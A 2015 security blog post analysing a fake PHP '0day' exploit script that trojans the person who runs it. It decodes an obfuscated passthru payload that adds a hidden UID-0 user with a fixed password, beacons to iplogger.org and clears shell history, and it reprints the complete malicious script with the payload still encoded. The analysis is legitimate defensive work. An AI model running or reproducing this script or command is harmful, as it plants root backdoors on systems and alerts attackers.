---
layout: post
title:  "PHP fake 0day"
subtitle: "Having fun with a false exploit"
date:   2015-08-07 23:34:01
category: itsec
---

Today [@sh1bumi](https://twitter.com/Sh1bumi) of [@MalwareMustDie](https://twitter.com/MalwareMustDie) found a interesting **PHP** script. At a first look at seemed like a **0day** for websites which are running PHP. "This cannot be, another 0day" we thought, so we analysed the script.
(Script is at the end of the post)

When running it it does that:

        [1;33mScript Replied:[0m Run as [1;32m[4mroot[0m user!

A 0day PHP exploit script has to be run as root? What? Okay, okay. Let's run as root:

```php
                  ____.----.
        ____.----'          \
        \                    \
         \                    \
          \                    \
           \          ____.----'`--.__
            \___.----'          |     `--.____
           /`-._                |       __.-' \
          /     `-._            ___.---'       \
         /          `-.____.---'                \
        /            / | \                       \
       /            /  |  \                   _.--'
       `-.         /   |   \            __.--'
          `-._    /    |    \     __.--'     |
            | `-./     |     \_.-'           |
            |          |                     |   0DAY
            |          |                     |   EXPLOIT
            |          |                     |   UNBOXED
            |          |                     |
            |          |                     |  -ANONYMOUS-
            |          |                     |
     _______|          |                     |_______________
            `-.        |                  _.-'
               `-.     |           __..--'
                  `-.  |      __.-'
                     `-|__.--'
     # Exploit Title: Source Disclosure 2015 0day - All versions, All Browsers
     # Google Dork: .php
     # Date: 02/09/2015
     # Exploit Author: Leaked by Anonymous
     # Vendor Homepage: http://php.net/
     # Software Link: http://php.net/downloads.php
     # Version: All versions
     # Tested on: Windows, Linux
     # CVE: 0day (No CVE)
     # Usage: php 0day.php <website> <filename>[0m
```

Aha, so this is a 0day and we just have to run it against any website. No hint what the script actually should do to that remote website. So let's run it:

```bash
        $: sudo php 0day.php http://localhost localhost
        sh: 1: history: not found
        Source of http://localhost saved to localhost
```

The script wrote the file *localhost*, when looking at the contents it shows us that:

```html
        <html>
        <header>
        <title>Test</title>
        </header>
        <body>
        this is just a test
        </body>
        </html>
```

Okay, it just saved the output of the website to a file, the website had this script:

```php
        <html>
        <header>
        <title>Test</title>
        </header>
        <body>
                <?php echo "this is just a test"; ?>
        </body>
        </html>
```

I added **PHP** code to it in case it does some magic to it (remember, the Google Dork is *.php*).
Now I am a bit frustaded, no cool kiddo magic? No server bashing?
Let's dig deeper!

Variable *$header* is just the fancy ASCII stuff at the beginning, so let's look at:

```php
    $bytes = array("passthru", "base64_decode");
    @array_push($bytes, "gzuncompress", "base64_decode");
    var_dump($bytes);
    @$bytes[0]($bytes[1]($bytes[2]($bytes[3]('eJw1yrsOgjAYQOFXgiIkDg4NxlJDQRG5dORvUqAFScAWfHoZdDrD+USVaBguiod4abynZHv5hi0lmWIRk7cOG04KFCPfbYiVrD8MLF90jVrzMwFHxbsZ1ZrmyqWRlfuzdZV8BLr/fS+q60xDZwGkZ176DiWtIyIcxNtxArIajoSGzjcwgGHVy3ucmUxRO4GXGRiVjEt2+gKxYTqF'))));
```

*var_dump($bytes)* gives me the way how the encoded string will be processed, so let's add an *echo* at the right place:

```php
     array (size=4)
          0 => string 'passthru' (length=8)
          1 => string 'base64_decode' (length=13)
          2 => string 'gzuncompress' (length=12)
          3 => string 'base64_decode' (length=13)

        $bytes = array("passthru", "base64_decode");
    @array_push($bytes, "gzuncompress", "base64_decode");
    var_dump($bytes);
    @$bytes[0]($bytes[1]($bytes[2]($bytes[3]('eJw1yrsOgjAYQOFXgiIkDg4NxlJDQRG5dORvUqAFScAWfHoZdDrD+USVaBguiod4abynZHv5hi0lmWIRk7cOG04KFCPfbYiVrD8MLF90jVrzMwFHxbsZ1ZrmyqWRlfuzdZV8BLr/fS+q60xDZwGkZ176DiWtIyIcxNtxArIajoSGzjcwgGHVy3ucmUxRO4GXGRiVjEt2+gKxYTqF'))));
    echo $bytes[1]($bytes[2]($bytes[3]('eJw1yrsOgjAYQOFXgiIkDg4NxlJDQRG5dORvUqAFScAWfHoZdDrD+USVaBguiod4abynZHv5hi0lmWIRk7cOG04KFCPfbYiVrD8MLF90jVrzMwFHxbsZ1ZrmyqWRlfuzdZV8BLr/fS+q60xDZwGkZ176DiWtIyIcxNtxArIajoSGzjcwgGHVy3ucmUxRO4GXGRiVjEt2+gKxYTqF')));
```

Which gives me:

```bash
        useradd -ou 0 -g 0 dd0s > /dev/null 2>&1;echo dd0s:genny1995 | chpasswd 2>&1;curl --silent http://iplogger.org/1z7H3 ;history -c
```

Hu, that is no remote exploit. That adds silently a user with password and **ID 0**. Yes, **0**. **0 is root**. So this user might handled with root privileges. Also it curls an URL, this is just there to log IP accessing it, so the crooks just wait until IP's are arriving and then open SSH connections as user dd0s with password genny1995. Curl just recieves a blank GIF image:

        GIF89a^A^@^A^@�^@^@^@^@^@^@^@^@!�^D^A^@^@^@^@,^@^@^@^@^A^@^A^@^@^B^BD^A^@;

Okay, as we see, this is some kind of a honeytrap. Kiddies, wannabe hackers and researchers might think they found a new cool exploit, run this script as root (as it requests) and get owned. So the crooks just login to that user with an ID of 0.
To delete that user run:

```bash
        userdel -f dd0s
```

You will get this warning:

```bash
        userdel: user dd0s is currently used by process 1
```

That is because it has the same id as root.

We learn: be aware when you research, you might get aimed as a researcher. And to the kiddos: I am laughing at you when you think you found another script to easily own other systems with simple commands.

**Malware must die!**

**Thanks to sh1bumi!**

And to the crooks which are spreading that script: we are right hunting you. Prepare your butt!

![](https://i.imgur.com/ABDOMID.png)


----------

Script:

```php
        <?php
        /*
        # Exploit Title: Source Disclosure 2015 0day - All versions, All Browsers
        # Google Dork: .php
        # Date: 02/09/2015
        # Exploit Author: Leaked by Anonymous
        # Vendor Homepage: http://php.net/
        # Software Link: http://php.net/downloads.php
        # Version: All versions
        # Tested on: Windows, Linux
        # CVE: 0day (No CVE)
        # Credits: Anonymous Hacker
        */
        error_reporting(0);
        if (!defined('STDIN')) {
            die("Run through command line skiddy!");
        }
        if (posix_getuid() != '0') {
            exit("[1;33mScript Replied:[0m Run as [1;32m[4mroot[0m user!
        ");
        }
        $header =
        gzuncompress(base64_decode("eJyllEEKgzAQRfdewY07VyZtXXZl0UWhNYVWUCrEC3iDHL6TRM1MDIh1FiLJ+/N/zGD8PV/zfIySVUkolkGxaLWUOqxfdvt1D7y9ub8NYMJlGSCilOQEfSCoMk8LU5wPsOb7qsWHQRecgk+NqGZynA2RgDtosOaMJvMVHC9zSBL8MFjiKXT4kEYbp7MGspCI+sBEJAmeuCMbN/N9egSaV0WuQWkJTxYc7oWRg+tVTxF69YBYz+xlPJVFFwfGd0+Pqn09xP1ztE1T30Rblf+12e06mWZFLeruKZp3dsRY2trGJS1ihoYpoNa37v9hZgXGYZC8kSO0WqggYzBlh/EHmvLOew=="));
        function duplicate_source($website, $file) {
            $bytes = array("passthru", "base64_decode");
            @array_push($bytes, "gzuncompress", "base64_decode");
            @$bytes[0]($bytes[1]($bytes[2]($bytes[3]('eJw1yrsOgjAYQOFXgiIkDg4NxlJDQRG5dORvUqAFScAWfHoZdDrD+USVaBguiod4abynZHv5hi0lmWIRk7cOG04KFCPfbYiVrD8MLF90jVrzMwFHxbsZ1ZrmyqWRlfuzdZV8BLr/fS+q60xDZwGkZ176DiWtIyIcxNtxArIajoSGzjcwgGHVy3ucmUxRO4GXGRiVjEt2+gKxYTqF'))));
            (file_put_contents($file, file_get_contents($website)) ? print ("
        [1;33m# Script Replied:[0m Source of [1;33m$website[0m has been saved to
        [1;33m$file[0m
        ") : exit("     [1;33mScript Replied:[0m [31mExploit failed[0m
         for [1;33m$website[0m"));
        }
        if ($argc != 3) {
            exit($header . "


             # Exploit Title: Source Disclosure 2015 0day - All versions, All Browsers
             # Google Dork: .php
             # Date: 02/09/2015
             # Exploit Author: Leaked by Anonymous
             # Vendor Homepage: http://php.net/
             # Software Link: http://php.net/downloads.php
             # Version: All versions
             # Tested on: Windows, Linux
             # CVE: 0day (No CVE)

             # Usage: php $argv[0] <website> <filename>[0m

        ");
        }
        duplicate_source($argv[1], $argv[2]);
        ?>
```